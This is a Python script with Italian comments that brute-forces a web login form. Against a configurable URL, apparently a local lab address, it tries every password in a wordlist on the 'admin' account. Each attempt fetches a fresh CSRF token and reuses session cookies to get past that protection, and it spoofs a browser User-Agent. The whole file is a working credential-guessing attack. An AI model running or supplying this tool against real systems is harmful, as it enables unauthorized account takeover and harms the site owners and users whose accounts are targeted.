import requests
from bs4 import BeautifulSoup
import sys

# --- CONFIGURAZIONE (MODIFICA QUI) ---
URL_LOGIN = "http://192.168.122.XX/login.php"  # L'indirizzo esatto del form
USER_TARGET = "admin"
WORDLIST_FILE = "passwords.txt"   # Assicurati che esista questo file
ERROR_MSG = "Credentials not valid." # La frase che appare QUANDO SBAGLI (copiala precisa)

# Nomi dei campi nel codice HTML (F12 per controllarli)
FIELD_USER = "username"       # name="..." del campo utente
FIELD_PASS = "password"       # name="..." del campo password
FIELD_TOKEN = "csrf_token"    # name="..." del campo nascosto token
FIELD_BUTTON = "Login"        # name="..." del bottone (spesso serve inviarlo)
VALUE_BUTTON = "Login"        # value="..." del bottone (quello che c'è scritto sopra)
# -------------------------------------

# Crea una sessione (fondamentale per mantenere i cookie tra GET e POST)
sessione = requests.Session()

def get_csrf_token(soup_obj):
    """Cerca il valore del token nell'HTML scaricato"""
    try:
        # Cerca l'input che ha il name specificato
        tag_input = soup_obj.find("input", {"name": FIELD_TOKEN})
        return tag_input["value"]
    except AttributeError:
        print("[!] Errore: Campo CSRF non trovato nella pagina. Controlla il 'name'.")
        sys.exit(1)

def bruteforce():
    print(f"[*] Inizio attacco su: {USER_TARGET} @ {URL_LOGIN}")
    
    try:
        with open(WORDLIST_FILE, "r") as f:
            passwords = f.readlines()
    except FileNotFoundError:
        print(f"[!] Errore: File {WORDLIST_FILE} non trovato.")
        return

    for password in passwords:
        password = password.strip()
        
        # 1. FASE GET: Scarichiamo la pagina per prendere il token fresco e i cookie
        r_get = sessione.get(URL_LOGIN)
        soup = BeautifulSoup(r_get.text, "html.parser")
        
        token = get_csrf_token(soup)
        
        # 2. FASE POST: Inviamo i dati
        payload = {
            FIELD_USER: USER_TARGET,
            FIELD_PASS: password,
            FIELD_TOKEN: token,
            FIELD_BUTTON: VALUE_BUTTON 
        }

        # Header per sembrare un browser vero (opzionale ma consigliato)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Referer': URL_LOGIN
        }

        print(f"[*] Provo password: {password} | Token usato: {token[:10]}...")
        
        r_post = sessione.post(URL_LOGIN, data=payload, headers=headers)

        # 3. VERIFICA: Se il messaggio di errore NON c'è, abbiamo vinto
        if ERROR_MSG not in r_post.text:
            print("\n" + "="*40)
            print(f"SUCCESS! Password trovata: {password}")
            print("="*40 + "\n")
            return
            
    print("[-] Attacco finito. Password non trovata nella lista.")

if __name__ == "__main__":
    bruteforce()
